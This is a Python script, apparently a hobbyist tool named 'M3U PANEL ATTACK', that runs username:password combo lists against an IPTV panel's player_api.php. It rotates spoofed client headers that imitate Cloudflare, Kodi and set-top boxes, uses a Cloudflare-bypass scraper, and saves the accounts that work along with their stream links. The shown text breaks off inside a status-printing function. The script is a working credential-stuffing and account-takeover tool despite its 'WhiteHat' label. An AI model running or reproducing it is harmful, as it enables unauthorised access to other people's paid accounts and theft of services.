import datetime
import os
import platform
import threading
import time
import re
import json
import sys
import random
from pathlib import Path
import subprocess
import logging

COLORS = {
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "RESET": "\033[0m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "BLUE_BOLD": "\033[1;34m",
    "ORANGE": "\033[38;5;202m",
    "LIGHT_YELLOW": "\033[38;5;226m",
    "LIGHT_PURPLE": "\033[38;5;134m",
    "BRIGHT_CYAN": "\033[38;5;51m",
    "BRIGHT_RED": "\033[1;31m",
    "BRIGHT_YELLOW": "\033[93m",
}

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def initialize_colorama():
    if os.name == "nt":
        from colorama import init
        init()
    import colorama
    colorama.init(autoreset=True)

initialize_colorama()

def import_or_install(package_name, import_name=None):
    try:
        if not import_name:
            import_name = package_name
        globals()[import_name] = __import__(package_name)
    except ModuleNotFoundError:
        clear_screen()
        print(f"[{package_name}] Loading module... \n")
        install(package_name)
        print(f"\n[{package_name}] Module loaded... \n")
        globals()[import_name] = __import__(package_name)

import_or_install("requests")
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import_or_install("colorama")

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:"
    "TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:"
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:"
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:"
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:"
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:"
    "TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:"
    "TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
    "TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:"
    "TLS13-AES-256-GCM-SHA384:ECDHE:!COMP"
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

try:
    import cfscrape
    session_requests = requests.Session()
    scraper_session = cfscrape.create_scraper(sess=session_requests)
except ModuleNotFoundError:
    scraper_session = requests.Session()

try:
    import androidhelper as sl4a
    android = sl4a.Android()
except ImportError:
    android = None

def display_banner():
    clear_screen()
    current_date = datetime.datetime.now().strftime("%Y-%m-%d")
    version = "v1.0.3"

    banner = f"""
\033[92m
══════════════════════════════════════════
\033[96m       🎮 WELCOME TO THE GAME 🎮   
\033[92m══════════════════════════════════════════
\033[94m
             ✪ M3U PANEL ATTACK ✪
\033[92m══════════════════════════════════════════
\033[0m  \033[96m WHITEHAT EDITION \033[0m🥷\033[92m
══════════════════════════════════════════
\033[0m \033[94m
  Version: {version}  \033[96m |  \033[94m Date: {current_date}
\033[0m \033[92m
══════════════════════════════════════════\033[0m
    """
    print(banner)

def display_user_agents():
    print("\033[1;32m┌───────────────────────────────\033[0m")
    for index, agent in enumerate(user_agents, start=1):
        print(f"\033[1;32m│\033[0m \033[1;33m{index} = {agent}\033[0m")
    print("\033[1;32m└───────────────────────────────\033[0m")

def get_user_agent_selection(option):
    if option == "1":
        display_user_agents()
        selection = input(f"\033[1;33m  Enter a single number = \033[0m")
        if selection:
            index = int(selection.strip())
            if 0 < index <= len(user_agents):
                return [user_agents[index - 1]]
    elif option == "2":
        display_user_agents()
        selection = input(f"\033[1;33m  Enter multiple numbers separated by commas = \033[0m")
        if selection:
            indices = [int(i.strip()) for i in selection.split(',')]
            return [user_agents[i - 1] for i in indices if 0 < i <= len(user_agents)]
    return None

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "VLC/3.0.16 LibVLC/3.0.16",
    "Lavf58.20.100",
    "stagefright/1.2 (Linux;Android 12)",
    "AppleCoreMedia/1.0.0.20E241 (Apple TV; U; CPU OS 16_0 like Mac OS X; de_de)",
    "Movian/5.0.488 (Linux; 4.4.0-59-generic; x86_64) CE-4300",
    "TiviMate/4.7.0 (Linux; Android 11)",
    "OTT Navigator/1.7.1.4 (Linux; Android 11)",
    "IPTVSmartersPro/3.1.5",
    "GSESmartIPTV/7.4",
    "XCIPTV/1.7.1",
    "PerfectPlayer/1.5.9",
    "Kodi/20.1 (Linux; Android 11)",
    "IPTVExtreme/2.1.2",
    "Televizo/1.9.1",
    "MYTVOnline3/3.0.0",
    "SparkleTV/1.4.2",
    "MXPlayer/1.36.11 (Linux; Android 9; en-US; AFTKA Build/PS7673.4183N)"
]

user_specified_agents = None

def get_next_user_agent():
    if user_specified_agents:
        if len(user_specified_agents) == 1:
            return user_specified_agents[0]
        else:
            user_agent = user_specified_agents.pop(0)
            user_specified_agents.append(user_agent)
            return user_agent
    else:
        user_agent = user_agents.pop(0)
        user_agents.append(user_agent)
        return user_agent

def get_fresh_random_headers():
    fresh_user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.55 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SHIELD Android TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
        "Mozilla/5.0 (Tizen 4.0; SAMSUNG SM-Z400Y) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/49.0.2623.75 Mobile Safari/537.36",
        "Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)",
        "Mozilla/5.0 (Roku/DVP-9.10) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36",
    ]

    accept_headers = [
        "application/json, text/javascript, */*; q=0.01",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    ]

    accept_encoding_headers = [
        "gzip, deflate",
        "gzip",
    ]

    accept_language_headers = [
        "en-US,en;q=0.5",
        "en-GB,en;q=0.5",
        "de-DE,de;q=0.5",
    ]

    headers = {
        "User-Agent": random.choice(fresh_user_agents),
        "Accept": random.choice(accept_headers),
        "Accept-Encoding": random.choice(accept_encoding_headers),
        "Accept-Language": random.choice(accept_language_headers),
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Referer": f"http://{portal}",
    }
    return headers

current_time = time.strftime("%H:%M:%S", time.localtime())
date_start = time.strftime("%d.%m.%Y")


clear_screen()
display_banner()


print("\033[1;32m┌───────────────────────────────\033[0m")
print("\033[1;32m│\033[0m \033[1;33m1 = Custom Setup\033[0m")
print("\033[1;32m│\033[0m \033[1;33m2 = Auto Setup\033[0m")
print("\033[1;32m└───────────────────────────────\033[0m")
setup_mode = input(f"\033[1;33m  Choose setup mode = \033[0m")

if platform.system() == "Darwin" and "iOS" in platform.platform():
    folder_path = os.path.join(os.path.expanduser("~"), "Documents")
    hits_directory = os.path.join(folder_path, "Hits/")
    combo_directory = os.path.join(folder_path, "combo/")
elif os.name == "posix":
    hits_directory = "/sdcard/M3uHits"
    combo_directory = "/sdcard/Combo"
elif os.name == "nt":
    hits_directory = "./M3uHits"
    combo_directory = "./Combo"
else:
    raise Exception("Operating system not supported")

os.makedirs(hits_directory, exist_ok=True)
os.makedirs(combo_directory, exist_ok=True)


print("\033[1;32m┌───────────────────────────────\033[0m")
combo_files = [file for file in os.listdir(combo_directory) if file.endswith(".txt")]
for index, file in enumerate(combo_files, start=1):
    print(f"\033[1;32m│\033[0m \033[1;33m{index} = {file}\033[0m")
print("\033[1;32m└───────────────────────────────\033[0m")


selected_combo_num = input(f"\033[1;33m  Choose your Combo = \033[0m")
combo_file_name = ""


for index, file in enumerate(combo_files, start=1):
    if selected_combo_num == str(index):
        selected_file = os.path.join(combo_directory, file)
        combo_file_name = file
        break

combo_file = selected_file
with open(selected_file, "r", encoding="utf-8-sig") as combo_content:
    combo_lines = combo_content.readlines()
combo_total_length = len(combo_lines)


if setup_mode == "2":
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print("\033[1;32m│\033[0m \033[1;33mEnter the panel URL:\033[0m")
    print("\033[1;32m└───────────────────────────────\033[0m")
    panel_input = input(f"\033[1;33m  Portal URL = \033[0m")
    if panel_input == "":
        print(f"You did not write the server name, exiting...")
        exit()

    panel = panel_input.replace("http://", "").replace("/c", "").replace("/", "")
    portal = panel
    fixed_panel = portal.replace(":", "_")

    # auto selections
    num_bots = 3

    
    categories = "1"

    
    nickname = "WhiteHat"

    
    attack_choice = "8"

else:
    
    clear_screen()
    display_banner()
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mDefault Bots = 3
    \033[1;32m│\033[0m
    \033[1;32m│\033[0m \033[1;33mChoose between 1 and 20 Bots\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    num_bots = input(f"\033[1;33m  Answer = \033[0m")
    if num_bots == "":
        num_bots = 3

    
    clear_screen()
    display_banner()
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mPanel and Port Info (Panel:Port)
    \033[1;32m│\033[0m \033[1;33m   
    \033[1;32m│\033[0m \033[1;33mWrite the panel name\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    panel_input = input(f"\033[1;33m  Portal = \033[0m")
    if panel_input == "":
        print(f"You did not write the server name, exiting...")
        exit()

    panel = panel_input.replace("http://", "").replace("/c", "").replace("/", "")
    portal = panel
    fixed_panel = portal.replace(":", "_")

    
    clear_screen()
    display_banner()
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mInclude categories list?
    \033[1;32m│
    \033[1;32m│\033[0m \033[1;33m1 = Info + Live Category
    \033[1;32m│\033[0m \033[1;33m2 = All (Info+Live+VOD+Series)
    \033[1;32m│\033[0m \033[1;33m3 = None (Only server information)\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    categories = input(f"\033[1;33m  Answer = \033[0m")
    if categories == "":
        categories = "1"

    
    clear_screen()
    display_banner()
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mDefault = WhiteHat
    \033[1;32m│\033[0m \033[1;33m
    \033[1;32m│\033[0m \033[1;33mWrite your name\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    nickname = input(f"\033[1;33m  Name = \033[0m")
    if nickname == "":
        nickname = "WhiteHat"

    
    clear_screen()
    display_banner()
    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mChoose your attack!
    \033[1;32m│
    \033[1;32m│\033[0m \033[1;33m1  = Random-Attack
    \033[1;32m│\033[0m \033[1;33m2  = Precision-Attack (CloudFlare-Standard)
    \033[1;32m│\033[0m \033[1;33m3  = Recon-Attack (Xseries/Android)
    \033[1;32m│\033[0m \033[1;33m4  = Tactical-Attack (Rotating)
    \033[1;32m│\033[0m \033[1;33m5  = Stealth-Attack (Kodi/Android)
    \033[1;32m│\033[0m \033[1;33m6  = Delay-Attack
    \033[1;32m│\033[0m \033[1;33m7  = Focused-Attack (Dalvik/Android 13)
    \033[1;32m│\033[0m \033[1;33m8  = STB-Attack (MAG254)
    \033[1;32m│\033[0m \033[1;33m9  = Ultra-Attack (CloudFlare-AlwaysOnline)
    \033[1;32m│\033[0m \033[1;33m10 = Advanced-Attack (AppleCoreMedia/Apple TV)
    \033[1;32m│\033[0m \033[1;33m11 = Samsung-SmartTV-Attack\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    attack_choice = input(f"\033[1;33m  Selection = \033[0m")

if attack_choice == "":
    attack_choice = "1"

attack_headers = {}
attack_type = ""
level = int(attack_choice)
referer_url = f"http://{portal}"

if attack_choice == "1":
    attack_type = "Random-Attack"
    agent_name = "Random"
    agent_suffix = "-Auto➚(Random)"
    agent_identifier = "Random-Agent"
    attack_headers = get_fresh_random_headers()

if attack_choice == "2":
    attack_type = "Precision-Attack"
    agent_name = "Mozilla"
    agent_suffix = "-Auto➚(cloud2)"
    agent_identifier = "CloudFlare-Standard"
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (compatible; CloudFlare-Standard/1.0; +https://www.cloudflare.com)",
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }

if attack_choice == "3":
    attack_type = "Recon-Attack"
    agent_name = "Xseries"
    agent_suffix = "-Auto➚(Scout)"
    agent_identifier = "Ultra-Series-Agent"
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Referer": referer_url,
        "DNT": "1",
    }

if attack_choice == "4":
    attack_type = "Tactical-Attack"
    agent_name = "Rotating"
    agent_suffix = "-Auto➚(Rotating)"
    agent_identifier = "Rotating-Agent"

    clear_screen()
    display_banner()

    print("\033[1;32m┌───────────────────────────────\033[0m")
    print(
        f"""\033[1;32m│\033[0m \033[1;33mChoose User Agent Selection Mode:
    \033[1;32m│\033[0m \033[1;33m1 = Single User Agent
    \033[1;32m│\033[0m \033[1;33m2 = Multiple User Agents
    \033[1;32m│\033[0m \033[1;33m3 = Default Rotating User Agents\033[0m"""
    )
    print("\033[1;32m└───────────────────────────────\033[0m")
    user_agent_mode = input(f"\033[1;33m  Selection = \033[0m")

    user_specified_agents = get_user_agent_selection(user_agent_mode)

    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": get_next_user_agent(),
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Referer": referer_url,
        "DNT": "1",
    }

if attack_choice == "5":
    attack_type = "Stealth-Attack"
    agent_name = "Kodi"
    agent_suffix = "-Sneak"
    agent_identifier = "Kodi-Agent"
    
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Kodi/18.2-RC1 (Linux; Android 6.0.1; StreamTV Build/V001S912_20191024) Android/6.0.1 Sys_CPU/armv8l App_Bitness/32 Version/18.2-RC1-Git:20190328-52e07cf-dirty",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "Upgrade, HTTP2-Settings",
        "Upgrade": "h2c",
        "HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA",
        "Accept-Charset": "UTF-8,*;q=0.8",
        "Cache-Control": "no-cache",
        "Referer": referer_url,
        "DNT": "1",
        "X-Requested-With": "XMLHttpRequest"
    }

if attack_choice == "6":
    attack_type = "Delay-Attack"
    agent_name = "Mozilla"
    agent_suffix = "-Auto➚(Delay)"
    agent_identifier = "Delay-Agent"
    delay_seconds = input(f"\033[1;33m  Enter delay in seconds = \033[0m")
    delay_seconds = int(delay_seconds) if delay_seconds.isdigit() else 0
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": referer_url,
        "DNT": "1",
    }

if attack_choice == "7":
    attack_type = "Focused-Attack"
    agent_name = "Roku"
    agent_suffix = "-Auto➚(Focused)"
    agent_identifier = "Roku-Device"
    
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "Roku/DVP-13.0 (13.0.0.24056-ED)",
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept": "*/*",
        "Referer": referer_url,
        "Accept-Encoding": "gzip, deflate",
    }

if attack_choice == "8":
    attack_type = "STB-Attack"
    agent_name = "MAG254"
    agent_suffix = "-Auto➚(STB)"
    agent_identifier = "STB-Agent"
    attack_headers = {
        "Cookie": "stb_lang=en; timezone=Europe%2FStockholm;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json, application/javascript, text/javascript, text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/537.36 (KHTML, like Gecko) MAG254 stbapp ver: 4 rev: 2721 Mobile Safari/537.36",
    }

if attack_choice == "9":
    attack_type = "Ultra-Attack"
    agent_name = "CloudFlare"
    agent_suffix = "-AlwaysOnline"
    agent_identifier = "CloudFlare-AlwaysOnline"
    attack_headers = {
        "User-Agent": "Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online)",
        "Referer": referer_url,
        "Report-To": '{"endpoints":[{"url":"https:\\/\\/a.nel.cloudflare.com\\/report\\/v4"}],"group":"cf-nel","max_age":604800}',
        "Server": "cloudflare",
        "X-User-Agent": "Model: MAG250; Link: WiFi",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "; stb_lang=en; timezone=Europe%2FParis; adid=2aedad3689e60c66185a2c7febb1f918",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
    }

if attack_choice == "10":
    attack_type = "Advanced-Attack"
    agent_name = "AppleCoreMedia"
    agent_suffix = "-Auto➚(Advanced)"
    agent_identifier = "Apple-Agent"
    attack_headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "AppleCoreMedia/1.0.0.20E241 (Apple TV; U; CPU OS 16_0 like Mac OS X; de_de)",
        "Host": portal,
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
    }

if attack_choice == "11":
    attack_type = "Samsung-SmartTV-Attack"
    agent_name = "SamsungSmartTV"
    agent_suffix = "-Auto➚(Samsung)"
    agent_identifier = "Samsung-SmartTV-Agent"
    
    attack_headers = {
        "User-Agent": "Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.128 SafaP8",
        "Accept": "*/*",
        "Accept-Encoding": "deflate, gzip",
        "Connection": "Keep-Alive",
        "icy-metadata": "1",
        "Range": "bytes=0-",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US,en"
    }

clear_screen()
display_banner()
print(f"\033[96m          Good Luck {nickname}!\033[0m")
time.sleep(1.5)

if platform.system() == "Windows":
    hits_path = "./M3uHits/"
elif platform.system() == "Darwin" and "iOS" in platform.platform():
    hits_path = os.path.join(os.path.expanduser("~"), "Documents", "Hits/")
else:
    hits_path = "/sdcard/M3uHits/"

os.makedirs(hits_path, exist_ok=True)

hits_file_path = os.path.join(hits_path, f"{fixed_panel}_✨m3uhits.txt")

def write_to_file(content):
    try:
        with open(hits_file_path, "a+", encoding="utf-8") as file:
            file.write(content)
    except Exception as e:
        print(f"Error writing to file: {e}")

total_hits = 0

def log_hit(hit_number, user_agent):
    log_file_path = os.path.join(hits_path, f"{fixed_panel}_log.txt")
    with open(log_file_path, "a+", encoding="utf-8") as log_file:
        log_file.write(f"Hit {hit_number} - {user_agent}\n")

def extract_status(veri):
    try:
        data = json.loads(veri)
        if "user_info" in data and "status" in data["user_info"]:
            return data["user_info"]["status"]

        elif "status" in data:
            return data["status"]
    except Exception:
        pass
    return None

def extract_field(data, field_path):
    try:
        parts = field_path.split(".")
        for part in parts:
            if isinstance(data, dict):
                data = data.get(part, None)
            else:
                return None
        return data
    except Exception:
        return None

def process_verification(data, username, password):
    global total_hits
    num_channels = 0
    num_movies = 0
    num_series = 0

    try:
        if Path().exists():
            android.mediaPlay()
    except Exception:
        pass

    data_json = json.loads(data)
    active_connections = extract_field(data_json, "user_info.active_cons")
    max_connections = extract_field(data_json, "user_info.max_connections")
    timezone = extract_field(data_json, "server_info.timezone")
    realm = extract_field(data_json, "server_info.url")
    port = extract_field(data_json, "server_info.port")
    user = extract_field(data_json, "user_info.username")
    password = extract_field(data_json, "user_info.password")
    status = extract_status(data)
    message = extract_field(data_json, "user_info.message") or ""
    expiration_date = extract_field(data_json, "user_info.exp_date")

    if expiration_date == "null" or expiration_date is None:
        expiration_date = "Unlimited"
    else:
        expiration_date = datetime.datetime.fromtimestamp(
            int(expiration_date)
        ).strftime("%Y-%m-%d %H:%M:%S")

    live_categories_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_live_categories"
    live_categories = ""
    if categories in ("1", "2"):
        try:
            response = scraper_session.get(
                live_categories_link, headers=attack_headers, verify=False
            )
            live_data = str(response.text)
            try:
                for i in live_data.split('category_name":"'):
                    live_categories += " ⚔️ " + str(
                        (i.split('"')[0]).encode("utf-8").decode("unicode-escape")
                    ).replace("\/", "/")
                live_categories = live_categories.replace(" ⚔️ [{ ⚔️ ", "").replace(
                    " ⚔️ []", "No categories"
                )
            except Exception:
                pass
        except (
            requests.RequestException
        ):
            pass

    vod_categories_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_vod_categories"
    vod_categories = ""
    if categories == "2":
        try:
            response = scraper_session.get(
                vod_categories_link, headers=attack_headers, verify=False
            )
            vod_data = str(response.text)
            try:
                for i in vod_data.split('category_name":"'):
                    vod_categories += "🥷" + str(
                        (i.split('"')[0]).encode("utf-8").decode("unicode-escape")
                    ).replace("\/", "/")
                vod_categories = vod_categories.replace("🥷[{🥷", "").replace(
                    "🥷[]", "No categories"
                )
            except Exception:
                pass
        except (
            requests.RequestException
        ):
            pass

    series_categories_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_series_categories"
    series_categories = ""
    if categories == "2":
        try:
            response = scraper_session.get(
                series_categories_link, headers=attack_headers, verify=False
            )
            series_data = str(response.text)
            try:
                for i in series_data.split('category_name":"'):
                    series_categories += "💣" + str(
                        (i.split('"')[0]).encode("utf-8").decode("unicode-escape")
                    ).replace("\/", "/")
                series_categories = series_categories.replace("💣[{💣", "").replace(
                    "💣[]", "No categories"
                )
            except Exception:
                pass
        except (
            requests.RequestException
        ):
            pass

    live_streams_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_live_streams"
    try:
        response = scraper_session.get(
            live_streams_link, headers=attack_headers, timeout=15, verify=False
        )
        live_data = str(response.text)
        if "stream_id" in live_data:
            num_channels = str(live_data.count("stream_id"))

            vod_streams_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_vod_streams"
            response = scraper_session.get(
                vod_streams_link, headers=attack_headers, timeout=15, verify=False
            )
            vod_data = str(response.text)
            num_movies = str(vod_data.count("stream_id"))

            series_link = f"http://{panel}/player_api.php?username={user}&password={password}&action=get_series"
            response = scraper_session.get(
                series_link, headers=attack_headers, timeout=15, verify=False
            )
            series_data = str(response.text)
            num_series = str(series_data.count("series_id"))
    except (
        requests.RequestException
    ):
        pass

    if status == "Active":
        status = "ACTIVE"

    
    result = ""

    if port:
        realm_with_port = f"{realm}:{port}"
    else:
        realm_with_port = realm

    
    split_portal = portal.split(":", 1)
    
    result = split_portal[0] + ":"

    m3u_link = (
        f"http://{result}{port}/get.php?username={user}&password={password}&type=m3u_plus"
    )

    epg_link = f"http://{result}{port}/xmltv.php?username={user}&password={password}"

    account_info = f"""
─────────────────────────
✪ M3U PANEL ATTACK ✪

    🥷 🥷 🥷
─────────────────────────
🟢Real URL: http://{realm}
🔵Scan URL: http://{portal}

🟢 Host URL: http://{result}{port}
🔵 Username: {user}
🟢 Password: {password}

🔵Expires On: {expiration_date}
🟢Connections: Active: {active_connections} / Max: {max_connections}
🔵Status: {status}
🟢Hits by: {nickname}
🔵WhiteHat Edition
─────────────────────────"""

    stream_links = ""
    if num_channels != "":
        stream_links = f"""
─────────────────────────
✪ M3U + EPG ✪
       
    🥷 🥷 🥷
─────────────────────────
🟢M3U Link: {m3u_link}

🟢EPG Link: {epg_link}
─────────────────────────"""

    messages = f"""
─────────────────────────
✪ ADDITIONAL INFO ✪
   
    🥷 🥷 🥷           
─────────────────────────
🔵Message: {message}
🔵TimeZone: {timezone}
─────────────────────────

─────────────────────────
✪ CONTENT INFO ✪

    🥷 🥷 🥷
─────────────────────────
🛰️Total Channels: [{num_channels}]
🎥Total Movies: [{num_movies}]
🎬Total Series: [{num_series}]
─────────────────────────

─────────────────────────
✪ CATEGORIES ✪

    🥷 🥷 🥷
─────────────────────────
{live_categories}
"""

    vod_and_series = ""
    if categories == "2":
        vod_and_series = f"""
─────────────────────────
✪ V.O.D ✪
        
    🥷 🥷 🥷
─────────────────────────
{vod_categories}

─────────────────────────
✪ SERIES ✪
        
    🥷 🥷 🥷
─────────────────────────
{series_categories}
"""

    write_to_file(account_info + stream_links + messages + vod_and_series + "\n")
    print(account_info + stream_links + messages + vod_and_series)



current_combo_index = 0

def get_combo_line():
    global current_combo_index
    try:
        line = combo_lines[current_combo_index]
        current_combo_index += 1
        return line
    except IndexError:
        return None

def calculate_score(total_hits, time_elapsed_seconds):
    intervals = time_elapsed_seconds // 600
    hits_per_interval = total_hits // (intervals + 1)

    if hits_per_interval == 0:
        interval_score = 0
    else:
        interval_score = 1 + (hits_per_interval - 1) * 5

    return interval_score * (intervals + 1)

def update_score(total_hits, time_elapsed_seconds):
    total_score = calculate_score(total_hits, time_elapsed_seconds)

    if time_elapsed_seconds >= 2400 and total_hits == 0:
        total_score -= 2

    return total_score

bot_count = 0

def print_status(
    username,
    password,
    bot_number,
    combo_index,
    combo_total_length,
    progress,
    total_hits,
    status_code,
    portal,
    nickname,
    attack_type,
    level,
    combo_file_name,
    start_time,
):
    current_time = time.strftime("%H:%M", time.localtime())
    time_elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time))
    time_elapsed_seconds = time.time() - start_time
    total_score = update_score(total_hits, time_elapsed_seconds)
    clear_screen()

    status_meanings = {
        200: "OK",
        301: "Moved Permanently",
        302: "Found",
        401: "Unauthorized",
        403: "Forbidden",
        404: "Not Found",
        407: "Proxy Authentication Required",
        429: "Too Many Requests",
        500: "Internal Server Error",
        503: "Service Unavailable",
        512: "Panel specific",
        513: "Panel specific",
        520: "Unknown Error",
    }

    status_meaning = status_meanings.get(status_code, "Unknown Status")

    if status_code == 200:
        color = "\33[1m\33[32m"
    elif status_code in [301, 302]:
        color = "\33[1m\33[1;31m"
    elif status_code in [401, 403]:
        color = "\33[1m\33[1;31m"
    elif status_code == 404:
        color = "\33[1m\33[38;5;202m"
    elif status_code == 407:
        color = "\33[1m\33[38;5;003m"
    elif status_code == 429:
        color = "\33[1m\33[93m"
    elif status_code == 500:
        color = "\33[1m\33[38;5;202m"
    elif status_code == 503:
        color = "\33[1m\33[38;5;226m"
    elif status_code in [512, 513]:
        color = "\33[1m\33[38;5;134m"
    elif status_code == 520:
        color = "\33[1m\33[35m"
    else:
        color = "\33[1m\33[37m"

    print(
        f"""
\033[94m╔══════════════════════════════════════════\033[0m
\033[94m║\033[92m       🥷 M3U PANEL ATTACK 🥷            \033[94m
\033[94m║\033[93m                🥷                \033[94m
\033[94m╠══════════════════════════════════════════\033[0m
\033[94m║\033[94m Bot \033[92m{bot_number} \033[94mChecking \033[93m{username}:{password} \033[94m
\033[94m╠══════════════════════════════════════════\033[0m
\033[94m║\033[93m 🔹 Panel        \033[92m➢ {portal} \033[94m
\033[94m║\033[93m 🔹 Combo        \033[92m➢ {combo_index:<3} / {combo_total_length} \033[94m
\033[94m║\033[93m 🔹 Progress     \033[92m➢ {progress:.2f}% \033[94m
\033[94m║\033[93m 🔹 Total Hits   \033[92m➢ {total_hits:<4} \033[94m
